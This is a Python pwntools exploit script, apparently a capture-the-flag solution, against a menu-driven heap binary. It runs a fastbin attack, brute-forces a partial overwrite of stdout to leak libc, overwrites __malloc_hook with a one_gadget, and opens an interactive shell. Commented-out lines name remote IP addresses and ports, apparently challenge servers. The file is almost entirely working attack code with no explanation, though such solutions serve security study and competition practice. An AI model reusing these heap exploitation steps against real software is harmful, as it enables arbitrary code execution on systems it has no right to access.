#!/usr/bin/python
#coding=utf-8
from pwn import *
# context.log_level = 'debug'
# p = process('./pwn')
elf = ELF('./pwn8')
libc = elf.libc
def add(size,payload):
	p.sendlineafter('>> ','1')
	p.sendlineafter('n',str(80))
	p.sendlineafter('?',str(size))
	p.sendafter('?',payload)

def delete(idx):
	p.sendlineafter('>> ','2')
	p.sendlineafter('?',str(idx))

def show(idx):
	p.sendlineafter('>> ','3')
	p.sendlineafter('?',str(idx))

def change(idx,payload):
	p.sendlineafter('>> ','4')
	p.sendlineafter('?',str(idx))
	p.sendafter('?',payload)
while(1):
	p = process('./maj0rone')
	# p = remote('123.56.52.128','18523')
	# p = remote('219.219.61.234',20034)
	add(0x90,'aaaa') #0
	add(0x10,'aaaa') #1
	delete(0)
	add(0x20,'aaaa') #2
	add(0x60,'aaaa') #3
	add(0x60,'bbbb') #4
	delete(3)
	payload = 'a'*0x20+p64(0)+p64(0x91)
	change(0,payload)
	delete(4)
	delete(3)
	change(3,'\xdd'+'\x15')
	payload = 'a'*0x20+p64(0)+p64(0x71)
	change(0,payload)
	gdb.attach(p)
	try:
		add(0x60,'aaaa')
		add(0x60,'aaaa')
		add(0x60,'aaaa') #7
	except EOFError:
		print 'error!!!'
		p.close()
		continue
	change(7,'\x00'*0x33 +p64(0xfbad1800)+p64(0)*3+p8(0))
	libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600
	malloc_hook = libc_base+libc.sym['__malloc_hook']
	one = [0x45226,0x4527a,0xf0364,0xf1207]
	one_gadget = libc_base+one[3]
	info(hex(one_gadget))
	info(hex(libc_base))
	add(0x60,'aaaa') #8
	delete(8)
	change(8,p64(malloc_hook-0x23))
	add(0x60,'aaaa') #9
	add(0x60,'aaaa') #10
	payload = '\x00'*0x13+p64(one_gadget)
	change(10,payload)
	p.sendlineafter('>> ','1')
	p.sendlineafter('n',str(80))
	p.sendline(str(0x10))
	
	# pause()
	p.interactive()
	exit(0)
